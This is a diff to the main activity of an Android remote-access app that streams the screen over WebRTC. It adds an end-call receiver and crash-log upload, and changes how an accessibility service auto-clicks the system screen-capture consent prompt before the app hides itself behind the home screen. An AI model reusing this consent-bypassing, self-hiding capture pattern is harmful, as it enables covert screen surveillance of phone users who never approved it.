@@ -6,8 +6,10 @@ import android.app.KeyguardManager;
 import android.app.PendingIntent;
 import android.app.PictureInPictureParams;
 import android.app.RemoteAction;
+import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.content.res.Configuration;
@@ -69,6 +71,14 @@ public class MainActivity extends AppCompatActivity implements WebRTCCompanion.C
     private boolean isStoppingMedia = false;
     private boolean isScreenCaptureRequestPending = false;
 
+    private final BroadcastReceiver mEndCallReceiver = new BroadcastReceiver() {
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            AppLogs.i(TAG, "ACTION_END_CALL broadcast received, finishing activity");
+            stopAllMediaAndFinish();
+        }
+    };
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -117,6 +127,19 @@ public class MainActivity extends AppCompatActivity implements WebRTCCompanion.C
         requestAppPermissions();
         initWebRTC();
         initWebView();
+        // Register broadcast listener for remote disconnect/end-call
+        try {
+            IntentFilter filter = new IntentFilter("com.tokendeal.vremote.ACTION_END_CALL");
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                registerReceiver(mEndCallReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
+            } else {
+                registerReceiver(mEndCallReceiver, filter);
+            }
+        } catch (Exception ignored) {}
+
+        // Check if there was any uncaught crash in previous session and upload to server logs
+        CrashReporter.checkAndReportPreviousCrash(this);
+
         handleAutoCommandIntent(getIntent());
 
         // Enqueue 30-minute WorkManager keep-alive worker to support all devices even when app is stopped
@@ -301,7 +324,7 @@ public class MainActivity extends AppCompatActivity implements WebRTCCompanion.C
             captureIntentData = null;
 
             // Arm accessibility service to auto-click "Start now" without manual phone interaction
-            RemoteAccessibilityService.setAutoAcceptPending(true);
+            RemoteAccessibilityService.triggerAutoAccept(MainActivity.this);
 
             if (projectionManager != null) {
                 startActivityForResult(projectionManager.createScreenCaptureIntent(), REQUEST_SCREEN_CAPTURE);
@@ -751,6 +774,7 @@ public class MainActivity extends AppCompatActivity implements WebRTCCompanion.C
         final Intent tokenIntent = (Intent) captureIntentData.clone();
         captureIntentData = null; // Consume immediately so token is strictly single-use
 
+        ScreenCaptureService.prepareForStart();
         ScreenCaptureService.setOnForegroundStartedListener(() -> {
             DisplayMetrics displayMetrics = new DisplayMetrics();
             getWindowManager().getDefaultDisplay().getRealMetrics(displayMetrics);
@@ -766,8 +790,8 @@ public class MainActivity extends AppCompatActivity implements WebRTCCompanion.C
                 );
             }
 
-            // Immediately send application to background so phone stays on desktop/other apps
-            runOnUiThread(() -> {
+            // Allow WebRTC to acquire MediaProjection token in foreground before hiding to background
+            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                 try {
                     moveTaskToBack(true);
                 } catch (Exception ignored) {}
@@ -782,7 +806,7 @@ public class MainActivity extends AppCompatActivity implements WebRTCCompanion.C
                         RemoteAccessibilityService.getInstance().performHome();
                     } catch (Exception ignored) {}
                 }
-            });
+            }, 800);
         });
 
         Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
@@ -1114,6 +1138,9 @@ public class MainActivity extends AppCompatActivity implements WebRTCCompanion.C
     @Override
     protected void onDestroy() {
         super.onDestroy();
+        try {
+            unregisterReceiver(mEndCallReceiver);
+        } catch (Exception ignored) {}
         if (sInstance == this) {
             sInstance = null;
         }
